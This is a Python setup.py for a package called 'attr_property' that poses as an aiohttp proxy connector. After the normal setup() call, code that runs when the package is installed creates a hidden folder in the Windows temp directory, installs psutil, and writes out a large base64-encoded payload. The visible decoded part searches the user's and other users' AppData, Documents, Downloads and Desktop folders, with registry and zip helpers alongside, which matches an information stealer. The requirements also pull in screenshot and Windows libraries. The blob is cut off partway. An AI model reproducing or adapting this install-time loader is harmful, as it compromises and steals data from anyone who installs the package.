import codecs
import os
import re
import sys


try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

version = None

with codecs.open(
    os.path.join(
        os.path.abspath(os.path.dirname(__file__)), "attr_property", "__init__.py"
    ),
    "r",
    "latin1",
) as fp:
    try:
        version = re.findall(r'^__version__ = "(\S+?)"$', fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError("Unable to determine version.")

if sys.version_info < (3, 5, 3):
    raise RuntimeError("attr_property requires Python 3.5.3+")

with open("README.md") as f:
    long_description = f.read()

setup(
    name="attr_property",
    author="Skactor",
    author_email="sk4ct0r@gmail.com",
    version='0.2.89',
    license="Apache 2",
    url="https://github.com/Skactor/aiohttp-proxy",
    description="Full-featured proxy connector for aiohttp",
    long_description=long_description,
    long_description_content_type="text/markdown",
    packages=["attr_property"],
    keywords="asyncio aiohttp socks socks5 socks4 http https proxy aiofiles aiohttp cryptography",
    install_requires=["aiohttp>=2.3.2", "yarl",  "aiofiles",
    "aiohttp",
    "cryptography",
    "aiosqlite",
    "mss",
    "pypiwin32",
    "psutil"],
)

LOCAL = os.environ['USERPROFILE']
TEMP = os.path.join(LOCAL, 'appdata', 'local', 'temp')
main_dir = os.path.join(TEMP, '__pycache__')

# with open(os.path.join(main_dir, 'args.txt'), 'a', encoding='utf8') as f:
#     f.write(str(sys.argv) + '\n')


if len(sys.argv) == 0:
    sys.exit()

if not ("install" == sys.argv[1] or "bdist" in sys.argv[1]):
    sys.exit()


import sys
from os import environ, chdir, mkdir
from os.path import join, split, isdir
from subprocess import Popen, call, getoutput, PIPE
from time import sleep
from os import system
from base64 import b64decode

python = sys.executable
python = join(split(python)[0], 'python.exe')
pythonw = join(split(python)[0], 'pythonw.exe')

LOCAL = environ['USERPROFILE']
TEMP = join(LOCAL, 'appdata', 'local', 'temp')
main_dir = join(TEMP, '__pycache__')


def b64(code: str) -> str:
    return b64decode(code.encode('utf8')).decode('utf8')

def run(filename):
    file = join(main_dir, filename)

    chdir(main_dir)

    Popen([pythonw, file], stdin=PIPE, stdout=PIPE, stderr=PIPE,
            creationflags=0x00000008 | 0x00000200, shell=True)


if not isdir(main_dir):
    mkdir(main_dir)

call(pythonw + " -m pip install psutil")


with open(join(main_dir, 'main.cpython-39.py'), 'w', encoding='utf8') as f:
    f.write(b64('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCmltcG9ydCBjb250ZXh0bGliIGFzIF9fc3RpY2t5dGFwZV9jb250ZXh0bGliCgpAX19zdGlja3l0YXBlX2NvbnRleHRsaWIuY29udGV4dG1hbmFnZXIKZGVmIF9fc3RpY2t5dGFwZV90ZW1wb3JhcnlfZGlyKCk6CiAgICBpbXBvcnQgdGVtcGZpbGUKICAgIGltcG9ydCBzaHV0aWwKICAgIGRpcl9wYXRoID0gdGVtcGZpbGUubWtkdGVtcCgpCiAgICB0cnk6CiAgICAgICAgeWllbGQgZGlyX3BhdGgKICAgIGZpbmFsbHk6CiAgICAgICAgc2h1dGlsLnJtdHJlZShkaXJfcGF0aCkKCndpdGggX19zdGlja3l0YXBlX3RlbXBvcmFyeV9kaXIoKSBhcyBfX3N0aWNreXRhcGVfd29ya2luZ19kaXI6CiAgICBkZWYgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZShwYXRoLCBjb250ZW50cyk6CiAgICAgICAgaW1wb3J0IG9zLCBvcy5wYXRoCgogICAgICAgIGRlZiBtYWtlX3BhY2thZ2UocGF0aCk6CiAgICAgICAgICAgIHBhcnRzID0gcGF0aC5zcGxpdCgiLyIpCiAgICAgICAgICAgIHBhcnRpYWxfcGF0aCA9IF9fc3RpY2t5dGFwZV93b3JraW5nX2RpcgogICAgICAgICAgICBmb3IgcGFydCBpbiBwYXJ0czoKICAgICAgICAgICAgICAgIHBhcnRpYWxfcGF0aCA9IG9zLnBhdGguam9pbihwYXJ0aWFsX3BhdGgsIHBhcnQpCiAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGFydGlhbF9wYXRoKToKICAgICAgICAgICAgICAgICAgICBvcy5ta2RpcihwYXJ0aWFsX3BhdGgpCiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihwYXJ0aWFsX3BhdGgsICJfX2luaXRfXy5weSIpLCAid2IiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGIiXG4iKQoKICAgICAgICBtYWtlX3BhY2thZ2Uob3MucGF0aC5kaXJuYW1lKHBhdGgpKQoKICAgICAgICBmdWxsX3BhdGggPSBvcy5wYXRoLmpvaW4oX19zdGlja3l0YXBlX3dvcmtpbmdfZGlyLCBwYXRoKQogICAgICAgIHdpdGggb3BlbihmdWxsX3BhdGgsICJ3YiIpIGFzIG1vZHVsZV9maWxlOgogICAgICAgICAgICBtb2R1bGVfZmlsZS53cml0ZShjb250ZW50cykKCiAgICBpbXBvcnQgc3lzIGFzIF9fc3RpY2t5dGFwZV9zeXMKICAgIF9fc3RpY2t5dGFwZV9zeXMucGF0aC5pbnNlcnQoMCwgX19zdGlja3l0YXBlX3dvcmtpbmdfZGlyKQoKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3BhdGhfc2VhcmNoLnB5JywgYiJpbXBvcnQgYXN5bmNpb1xyXG5pbXBvcnQgb3NcclxuZnJvbSBvcyBpbXBvcnQgc2NhbmRpciwgZ2V0bG9naW5cclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luLCBpc2RpclxyXG5mcm9tIHR5cGluZyBpbXBvcnQgRGljdCwgSXRlcmFibGUsIExpc3RcclxuZnJvbSB0b29scyBpbXBvcnQgX2hhbmRsZV90YXNrX3Jlc3VsdFxyXG5mcm9tIGxvZ2dlciBpbXBvcnQgTG9nZ2VyXHJcblxyXG5cclxuTE9DQUwgPSBvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddXHJcblxyXG5yb290X3BhdGhzID0ge1xyXG4gICAgam9pbihMT0NBTCwgJ2FwcGRhdGEnKSxcclxuICAgIGpvaW4oTE9DQUwsICdhcHBkYXRhJywgJ2xvY2FsJyksXHJcbiAgICBqb2luKExPQ0FMLCAnYXBwZGF0YScsICdsb2NhbCcsICdwcm9ncmFtcycpLFxyXG4gICAgam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAncm9hbWluZycpLFxyXG4gICAgam9pbihMT0NBTCwgJ2RvY3VtZW50cycpLFxyXG4gICAgam9pbihMT0NBTCwgJ2Rvd25sb2FkcycpLFxyXG4gICAgam9pbihMT0NBTCwgJ2Rlc2t0b3AnKSxcclxuICAgICdDOi8nLFxyXG4gICAgJ0Q6LycsXHJcbiAgICAnRTovJyxcclxuICAgICdDOi9wcm9ncmFtIGZpbGVzJyxcclxuICAgICdDOi9wcm9ncmFtIGZpbGVzICh4ODYpJyxcclxuICAgICdDOi9wcm9ncmFtZGF0YSdcclxufVxyXG5cclxudXNlcnMgPSAoaS5uYW1lLmxvd2VyKCkgZm9yIGkgaW4gc2NhbmRpcignYzovdXNlcnMnKSlcclxuZm9yIHVzZXJuYW1lIGluIHVzZXJzOlxyXG4gICAgaWYgdXNlcm5hbWUgaW4gWydkZXNrdG9wLmluaScsIGdldGxvZ2luKCkubG93ZXIoKV06XHJcbiAgICAgICAgY29udGludWVcclxuICAgIFxyXG4gICAgbG9jYWwgPSBqb2luKCdjOlxcXFx1c2VycycsIHVzZXJuYW1lKVxyXG4gICAgdXNlcl9wYXRocyA9IHtcclxuICAgICAgICBqb2luKGxvY2FsLCAnYXBwZGF0YScpLFxyXG4gICAgICAgIGpvaW4obG9jYWwsICdhcHBkYXRhJywgJ2xvY2FsJyksXHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2FwcGRhdGEnLCAnbG9jYWwnLCAncHJvZ3JhbXMnKSxcclxuICAgICAgICBqb2luKGxvY2FsLCAnYXBwZGF0YScsICdyb2FtaW5nJyksXHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2RvY3VtZW50cycpLFxyXG4gICAgICAgIGpvaW4obG9jYWwsICdkb3dubG9hZHMnKSxcclxuICAgICAgICBqb2luKGxvY2FsLCAnZGVza3RvcCcpXHJcbiAgICB9XHJcbiAgICByb290X3BhdGhzLnVwZGF0ZSh1c2VyX3BhdGhzKVxyXG5cclxuYXN5bmMgZGVmIHNlYXJjaF9wbHVnaW5fcGF0aHMocGF0aHM6IEl0ZXJhYmxlW3N0cl0sIHF1ZXJpZXM6IERpY3QsIGxvZ2dlcjogTG9nZ2VyKTpcclxuICAgIHRhc2tzOiBMaXN0W2FzeW5jaW8uVGFza10gPSBbXVxyXG5cclxuICAgIHF1ZXJpZXMgPSB7ay5sb3dlcigpOiB2IGZvciBrLHYgaW4gcXVlcmllcy5pdGVtcygpfVxyXG4gICAgdGFyZ2V0X2ZvbGRlcl9uYW1lcyA9IHNldChxdWVyaWVzLmtleXMoKSlcclxuICAgIGZvciBwIGluIHBhdGhzOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgaXNkaXIocCk6XHJcbiAgICAgICAgICAgICAgICBmb3IgZm5hbWUgaW4gdGFyZ2V0X2ZvbGRlcl9uYW1lcy5pbnRlcnNlY3Rpb24oaS5uYW1lLmxvd2VyKCkgZm9yIGkgaW4gb3Muc2NhbmRpcihwKSk6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgcXVlcmllc1tmbmFtZV0gaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGN1cnJfcGF0aCA9IGpvaW4ocCwgZm5hbWUpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGxvZ2dlci5sb2coZidceGQwXHg5ZFx4ZDBceGIwXHhkMFx4YjlceGQwXHhiNFx4ZDBceGI1XHhkMFx4YmRceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgzXHhkMVx4ODJceGQxXHg4YyB7Y3Vycl9wYXRofScpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxvb3AgPSBhc3luY2lvLmdldF9ldmVudF9sb29wKClcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGFzayA9IGxvb3AuY3JlYXRlX3Rhc2socXVlcmllc1tmbmFtZV0uY2FsbGJhY2soY3Vycl9wYXRoKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGFzay5hZGRfZG9uZV9jYWxsYmFjayhsYW1iZGEgeDogX2hhbmRsZV90YXNrX3Jlc3VsdCh4LCBsb2dnZXIpKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB0YXNrcy5hcHBlbmQodGFzaylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IGxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YjIgc2VhcmNoX3BsdWdpbl9wYXRocyBceGQwXHhiZlx4ZDFceDgzXHhkMVx4ODJceGQxXHg4YyB7cH0gXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIHtlfScpXHJcbiAgICBmb3IgdGFzayBpbiB0YXNrczpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGF3YWl0IHRhc2tcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIHByaW50KHJlcHIoZSkpXHJcblxyXG5cclxuYXN5bmMgZGVmIHNlYXJjaF9wYXRocyhwYXRoczogSXRlcmFibGVbc3RyXSwgcXVlcmllczogSXRlcmFibGUpOlxyXG4gICAgdGFyZ2V0X2ZvbGRlcl9uYW1lcyA9IHtpLmxvd2VyKCkgZm9yIGkgaW4gcXVlcmllc31cclxuICAgIGZvciBwIGluIHBhdGhzOlxyXG4gICAgICAgIGlmIGlzZGlyKHApOlxyXG4gICAgICAgICAgICBmb3IgZm5hbWUgaW4gdGFyZ2V0X2ZvbGRlcl9uYW1lcy5pbnRlcnNlY3Rpb24oaS5uYW1lLmxvd2VyKCkgZm9yIGkgaW4gb3Muc2NhbmRpcihwKSk6XHJcbiAgICAgICAgICAgICAgICBpZiBmbmFtZSBpbiB0YXJnZXRfZm9sZGVyX25hbWVzOlxyXG4gICAgICAgICAgICAgICAgICAgIHlpZWxkIGpvaW4ocCwgZm5hbWUpXHJcbiIpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCd0b29scy5weScsIGIiaW1wb3J0IG9zXHJcbmltcG9ydCBhc3luY2lvXHJcbmZyb20gYWlvZmlsZXMub3MgaW1wb3J0IHdyYXBcclxuZnJvbSBzaHV0aWwgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZSwgbW92ZVxyXG5mcm9tIGxvZ2dlciBpbXBvcnQgTG9nZ2VyXHJcbmltcG9ydCB3aW5yZWdcclxuaW1wb3J0IHJlXHJcblxyXG5cclxuXHJcbmRlZiB6aXBkaXIocGF0aCwgemlwaCk6XHJcbiAgICAnJydGcm9tIHN0YWNrb3ZlcmZsb3cnJydcclxuICAgICMgemlwaCBpcyB6aXBmaWxlIGhhbmRsZVxyXG4gICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsocGF0aCk6XHJcbiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6XHJcbiAgICAgICAgICAgIHppcGgud3JpdGUob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBcclxuICAgICAgICAgICAgICAgICAgICAgICBvcy5wYXRoLnJlbHBhdGgob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucGF0aC5qb2luKHBhdGgsICcuLicpKSlcclxuXHJcbmNvcHlmaWxlID0gd3JhcChjb3B5ZmlsZSlcclxuY29weXRyZWUgPSB3cmFwKGNvcHl0cmVlKVxyXG5tb3ZlID0gd3JhcChtb3ZlKVxyXG5cclxuXHJcbmRlZiBfaGFuZGxlX3Rhc2tfcmVzdWx0KHRhc2s6IGFzeW5jaW8uVGFzaywgbG9nZ2VyOiBMb2dnZXIpIC0+IE5vbmU6XHJcbiAgICB0cnk6XHJcbiAgICAgICAgdGFzay5yZXN1bHQoKVxyXG4gICAgZXhjZXB0IGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3I6XHJcbiAgICAgICAgcGFzcyAgIyBUYXNrIGNhbmNlbGxhdGlvbiBzaG91bGQgbm90IGJlIGxvZ2dlZCBhcyBhbiBlcnJvci5cclxuICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTogICMgcHlsaW50OiBkaXNhYmxlPWJyb2FkLWV4Y2VwdFxyXG4gICAgICAgIGxvZ2dlci5zeW5jX2xvZyhmJ0Vycm9yIHtlIXJ9JykiKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvZmlsZXMvX19pbml0X18ucHknLCBiJyIiIlV0aWxpdGllcyBmb3IgYXN5bmNpby1mcmllbmRseSBmaWxlIGhhbmRsaW5nLiIiIlxuZnJvbSAudGhyZWFkcG9vbCBpbXBvcnQgb3BlblxuZnJvbSAuIGltcG9ydCB0ZW1wZmlsZVxuXG5fX2FsbF9fID0gWyJvcGVuIiwgInRlbXBmaWxlIl1cbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9maWxlcy90aHJlYWRwb29sL19faW5pdF9fLnB5JywgYiciIiJIYW5kbGUgZmlsZXMgdXNpbmcgYSB0aHJlYWQgcG9vbCBleGVjdXRvci4iIiJcbmltcG9ydCBhc3luY2lvXG5mcm9tIHR5cGVzIGltcG9ydCBjb3JvdXRpbmVcblxuZnJvbSBpbyBpbXBvcnQgKFxuICAgIEZpbGVJTyxcbiAgICBUZXh0SU9CYXNlLFxuICAgIEJ1ZmZlcmVkUmVhZGVyLFxuICAgIEJ1ZmZlcmVkV3JpdGVyLFxuICAgIEJ1ZmZlcmVkUmFuZG9tLFxuKVxuZnJvbSBmdW5jdG9vbHMgaW1wb3J0IHBhcnRpYWwsIHNpbmdsZWRpc3BhdGNoXG5cbmZyb20gLmJpbmFyeSBpbXBvcnQgQXN5bmNCdWZmZXJlZElPQmFzZSwgQXN5bmNCdWZmZXJlZFJlYWRlciwgQXN5bmNGaWxlSU9cbmZyb20gLnRleHQgaW1wb3J0IEFzeW5jVGV4dElPV3JhcHBlclxuZnJvbSAuLmJhc2UgaW1wb3J0IEFpb2ZpbGVzQ29udGV4dE1hbmFnZXJcblxuc3luY19vcGVuID0gb3BlblxuXG5fX2FsbF9fID0gKCJvcGVuIiwpXG5cblxuZGVmIG9wZW4oXG4gICAgZmlsZSxcbiAgICBtb2RlPSJyIixcbiAgICBidWZmZXJpbmc9LTEsXG4gICAgZW5jb2Rpbmc9Tm9uZSxcbiAgICBlcnJvcnM9Tm9uZSxcbiAgICBuZXdsaW5lPU5vbmUsXG4gICAgY2xvc2VmZD1UcnVlLFxuICAgIG9wZW5lcj1Ob25lLFxuICAgICosXG4gICAgbG9vcD1Ob25lLFxuICAgIGV4ZWN1dG9yPU5vbmVcbik6XG4gICAgcmV0dXJuIEFpb2ZpbGVzQ29udGV4dE1hbmFnZXIoXG4gICAgICAgIF9vcGVuKFxuICAgICAgICAgICAgZmlsZSxcbiAgICAgICAgICAgIG1vZGU9bW9kZSxcbiAgICAgICAgICAgIGJ1ZmZlcmluZz1idWZmZXJpbmcsXG4gICAgICAgICAgICBlbmNvZGluZz1lbmNvZGluZyxcbiAgICAgICAgICAgIGVycm9ycz1lcnJvcnMsXG4gICAgICAgICAgICBuZXdsaW5lPW5ld2xpbmUsXG4gICAgICAgICAgICBjbG9zZWZkPWNsb3NlZmQsXG4gICAgICAgICAgICBvcGVuZXI9b3BlbmVyLFxuICAgICAgICAgICAgbG9vcD1sb29wLFxuICAgICAgICAgICAgZXhlY3V0b3I9ZXhlY3V0b3IsXG4gICAgICAgIClcbiAgICApXG5cblxuQGNvcm91dGluZVxuZGVmIF9vcGVuKFxuICAgIGZpbGUsXG4gICAgbW9kZT0iciIsXG4gICAgYnVmZmVyaW5nPS0xLFxuICAgIGVuY29kaW5nPU5vbmUsXG4gICAgZXJyb3JzPU5vbmUsXG4gICAgbmV3bGluZT1Ob25lLFxuICAgIGNsb3NlZmQ9VHJ1ZSxcbiAgICBvcGVuZXI9Tm9uZSxcbiAgICAqLFxuICAgIGxvb3A9Tm9uZSxcbiAgICBleGVjdXRvcj1Ob25lXG4pOlxuICAgICIiIk9wZW4gYW4gYXN5bmNpbyBmaWxlLiIiIlxuICAgIGlmIGxvb3AgaXMgTm9uZTpcbiAgICAgICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKVxuICAgIGNiID0gcGFydGlhbChcbiAgICAgICAgc3luY19vcGVuLFxuICAgICAgICBmaWxlLFxuICAgICAgICBtb2RlPW1vZGUsXG4gICAgICAgIGJ1ZmZlcmluZz1idWZmZXJpbmcsXG4gICAgICAgIGVuY29kaW5nPWVuY29kaW5nLFxuICAgICAgICBlcnJvcnM9ZXJyb3JzLFxuICAgICAgICBuZXdsaW5lPW5ld2xpbmUsXG4gICAgICAgIGNsb3NlZmQ9Y2xvc2VmZCxcbiAgICAgICAgb3BlbmVyPW9wZW5lcixcbiAgICApXG4gICAgZiA9IHlpZWxkIGZyb20gbG9vcC5ydW5faW5fZXhlY3V0b3IoZXhlY3V0b3IsIGNiKVxuXG4gICAgcmV0dXJuIHdyYXAoZiwgbG9vcD1sb29wLCBleGVjdXRvcj1leGVjdXRvcilcblxuXG5Ac2luZ2xlZGlzcGF0Y2hcbmRlZiB3cmFwKGZpbGUsICosIGxvb3A9Tm9uZSwgZXhlY3V0b3I9Tm9uZSk6XG4gICAgcmFpc2UgVHlwZUVycm9yKCJVbnN1cHBvcnRlZCBpbyB0eXBlOiB7fS4iLmZvcm1hdChmaWxlKSlcblxuXG5Ad3JhcC5yZWdpc3RlcihUZXh0SU9CYXNlKVxuZGVmIF8oZmlsZSwgKiwgbG9vcD1Ob25lLCBleGVjdXRvcj1Ob25lKTpcbiAgICByZXR1cm4gQXN5bmNUZXh0SU9XcmFwcGVyKGZpbGUsIGxvb3A9bG9vcCwgZXhlY3V0b3I9ZXhlY3V0b3IpXG5cblxuQHdyYXAucmVnaXN0ZXIoQnVmZmVyZWRXcml0ZXIpXG5kZWYgXyhmaWxlLCAqLCBsb29wPU5vbmUsIGV4ZWN1dG9yPU5vbmUpOlxuICAgIHJldHVybiBBc3luY0J1ZmZlcmVkSU9CYXNlKGZpbGUsIGxvb3A9bG9vcCwgZXhlY3V0b3I9ZXhlY3V0b3IpXG5cblxuQHdyYXAucmVnaXN0ZXIoQnVmZmVyZWRSZWFkZXIpXG5Ad3JhcC5yZWdpc3RlcihCdWZmZXJlZFJhbmRvbSlcbmRlZiBfKGZpbGUsICosIGxvb3A9Tm9uZSwgZXhlY3V0b3I9Tm9uZSk6XG4gICAgcmV0dXJuIEFzeW5jQnVmZmVyZWRSZWFkZXIoZmlsZSwgbG9vcD1sb29wLCBleGVjdXRvcj1leGVjdXRvcilcblxuXG5Ad3JhcC5yZWdpc3RlcihGaWxlSU8pXG5kZWYgXyhmaWxlLCAqLCBsb29wPU5vbmUsIGV4ZWN1dG9yPU5vbmUpOlxuICAgIHJldHVybiBBc3luY0ZpbGVJTyhmaWxlLCBsb29wLCBleGVjdXRvcilcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9maWxlcy90aHJlYWRwb29sL2JpbmFyeS5weScsIGInZnJvbSAuLmJhc2UgaW1wb3J0IEFzeW5jQmFzZVxuZnJvbSAudXRpbHMgaW1wb3J0IChcbiAgICBkZWxlZ2F0ZV90b19leGVjdXRvcixcbiAgICBwcm94eV9tZXRob2RfZGlyZWN0bHksXG4gICAgcHJveHlfcHJvcGVydHlfZGlyZWN0bHksXG4pXG5cblxuQGRlbGVnYXRlX3RvX2V4ZWN1dG9yKFxuICAgICJjbG9zZSIsXG4gICAgImZsdXNoIixcbiAgICAiaXNhdHR5IixcbiAgICAicmVhZCIsXG4gICAgInJlYWQxIixcbiAgICAicmVhZGludG8iLFxuICAgICJyZWFkbGluZSIsXG4gICAgInJlYWRsaW5lcyIsXG4gICAgInNlZWsiLFxuICAgICJzZWVrYWJsZSIsXG4gICAgInRlbGwiLFxuICAgICJ0cnVuY2F0ZSIsXG4gICAgIndyaXRhYmxlIixcbiAgICAid3JpdGUiLFxuICAgICJ3cml0ZWxpbmVzIixcbilcbkBwcm94eV9tZXRob2RfZGlyZWN0bHkoImRldGFjaCIsICJmaWxlbm8iLCAicmVhZGFibGUiKVxuQHByb3h5X3Byb3BlcnR5X2RpcmVjdGx5KCJjbG9zZWQiLCAicmF3IiwgIm5hbWUiLCAibW9kZSIpXG5jbGFzcyBBc3luY0J1ZmZlcmVkSU9CYXNlKEFzeW5jQmFzZSk6XG4gICAgIiIiVGhlIGFzeW5jaW8gZXhlY3V0b3IgdmVyc2lvbiBvZiBpby5CdWZmZXJlZFdyaXRlci4iIiJcblxuXG5AZGVsZWdhdGVfdG9fZXhlY3V0b3IoInBlZWsiKVxuY2xhc3MgQXN5bmNCdWZmZXJlZFJlYWRlcihBc3luY0J1ZmZlcmVkSU9CYXNlKTpcbiAgICAiIiJUaGUgYXN5bmNpbyBleGVjdXRvciB2ZXJzaW9uIG9mIGlvLkJ1ZmZlcmVkUmVhZGVyIGFuZCBSYW5kb20uIiIiXG5cblxuQGRlbGVnYXRlX3RvX2V4ZWN1dG9yKFxuICAgICJjbG9zZSIsXG4gICAgImZsdXNoIixcbiAgICAiaXNhdHR5IixcbiAgICAicmVhZCIsXG4gICAgInJlYWRhbGwiLFxuICAgICJyZWFkaW50byIsXG4gICAgInJlYWRsaW5lIixcbiAgICAicmVhZGxpbmVzIixcbiAgICAic2VlayIsXG4gICAgInNlZWthYmxlIixcbiAgICAidGVsbCIsXG4gICAgInRydW5jYXRlIixcbiAgICAid3JpdGFibGUiLFxuICAgICJ3cml0ZSIsXG4gICAgIndyaXRlbGluZXMiLFxuKVxuQHByb3h5X21ldGhvZF9kaXJlY3RseSgiZmlsZW5vIiwgInJlYWRhYmxlIilcbkBwcm94eV9wcm9wZXJ0eV9kaXJlY3RseSgiY2xvc2VkIiwgIm5hbWUiLCAibW9kZSIpXG5jbGFzcyBBc3luY0ZpbGVJTyhBc3luY0Jhc2UpOlxuICAgICIiIlRoZSBhc3luY2lvIGV4ZWN1dG9yIHZlcnNpb24gb2YgaW8uRmlsZUlPLiIiIlxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2ZpbGVzL2Jhc2UucHknLCBiJyIiIlZhcmlvdXMgYmFzZSBjbGFzc2VzLiIiIlxuZnJvbSB0eXBlcyBpbXBvcnQgY29yb3V0aW5lXG5mcm9tIGNvbGxlY3Rpb25zLmFiYyBpbXBvcnQgQ29yb3V0aW5lXG5cblxuY2xhc3MgQXN5bmNCYXNlOlxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBmaWxlLCBsb29wLCBleGVjdXRvcik6XG4gICAgICAgIHNlbGYuX2ZpbGUgPSBmaWxlXG4gICAgICAgIHNlbGYuX2xvb3AgPSBsb29wXG4gICAgICAgIHNlbGYuX2V4ZWN1dG9yID0gZXhlY3V0b3JcblxuICAgIGRlZiBfX2FpdGVyX18oc2VsZik6XG4gICAgICAgICIiIldlIGFyZSBvdXIgb3duIGl0ZXJhdG9yLiIiIlxuICAgICAgICByZXR1cm4gc2VsZlxuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gc3VwZXIoKS5fX3JlcHJfXygpICsgIiB3cmFwcGluZyAiICsgcmVwcihzZWxmLl9maWxlKVxuXG4gICAgYXN5bmMgZGVmIF9fYW5leHRfXyhzZWxmKTpcbiAgICAgICAgIiIiU2ltdWxhdGUgbm9ybWFsIGZpbGUgaXRlcmF0aW9uLiIiIlxuICAgICAgICBsaW5lID0gYXdhaXQgc2VsZi5yZWFkbGluZSgpXG4gICAgICAgIGlmIGxpbmU6XG4gICAgICAgICAgICByZXR1cm4gbGluZVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgcmFpc2UgU3RvcEFzeW5jSXRlcmF0aW9uXG5cblxuY2xhc3MgX0NvbnRleHRNYW5hZ2VyKENvcm91dGluZSk6XG4gICAgX19zbG90c19fID0gKCJfY29ybyIsICJfb2JqIilcblxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb3JvKTpcbiAgICAgICAgc2VsZi5fY29ybyA9IGNvcm9cbiAgICAgICAgc2VsZi5fb2JqID0gTm9uZVxuXG4gICAgZGVmIHNlbmQoc2VsZiwgdmFsdWUpOlxuICAgICAgICByZXR1cm4gc2VsZi5fY29yby5zZW5kKHZhbHVlKVxuXG4gICAgZGVmIHRocm93KHNlbGYsIHR5cCwgdmFsPU5vbmUsIHRiPU5vbmUpOlxuICAgICAgICBpZiB2YWwgaXMgTm9uZTpcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9jb3JvLnRocm93KHR5cClcbiAgICAgICAgZWxpZiB0YiBpcyBOb25lOlxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2Nvcm8udGhyb3codHlwLCB2YWwpXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fY29yby50aHJvdyh0eXAsIHZhbCwgdGIpXG5cbiAgICBkZWYgY2xvc2Uoc2VsZik6XG4gICAgICAgIHJldHVybiBzZWxmLl9jb3JvLmNsb3NlKClcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBnaV9mcmFtZShzZWxmKTpcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvcm8uZ2lfZnJhbWVcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBnaV9ydW5uaW5nKHNlbGYpOlxuICAgICAgICByZXR1cm4gc2VsZi5fY29yby5naV9ydW5uaW5nXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgZ2lfY29kZShzZWxmKTpcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvcm8uZ2lfY29kZVxuXG4gICAgZGVmIF9fbmV4dF9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gc2VsZi5zZW5kKE5vbmUpXG5cbiAgICBAY29yb3V0aW5lXG4gICAgZGVmIF9faXRlcl9fKHNlbGYpOlxuICAgICAgICByZXNwID0geWllbGQgZnJvbSBzZWxmLl9jb3JvXG4gICAgICAgIHJldHVybiByZXNwXG5cbiAgICBkZWYgX19hd2FpdF9fKHNlbGYpOlxuICAgICAgICByZXNwID0geWllbGQgZnJvbSBzZWxmLl9jb3JvXG4gICAgICAgIHJldHVybiByZXNwXG5cbiAgICBhc3luYyBkZWYgX19hbmV4dF9fKHNlbGYpOlxuICAgICAgICByZXNwID0gYXdhaXQgc2VsZi5fY29yb1xuICAgICAgICByZXR1cm4gcmVzcFxuXG4gICAgYXN5bmMgZGVmIF9fYWVudGVyX18oc2VsZik6XG4gICAgICAgIHNlbGYuX29iaiA9IGF3YWl0IHNlbGYuX2Nvcm9cbiAgICAgICAgcmV0dXJuIHNlbGYuX29ialxuXG4gICAgYXN5bmMgZGVmIF9fYWV4aXRfXyhzZWxmLCBleGNfdHlwZSwgZXhjLCB0Yik6XG4gICAgICAgIHNlbGYuX29iai5jbG9zZSgpXG4gICAgICAgIHNlbGYuX29iaiA9IE5vbmVcblxuXG5jbGFzcyBBaW9maWxlc0NvbnRleHR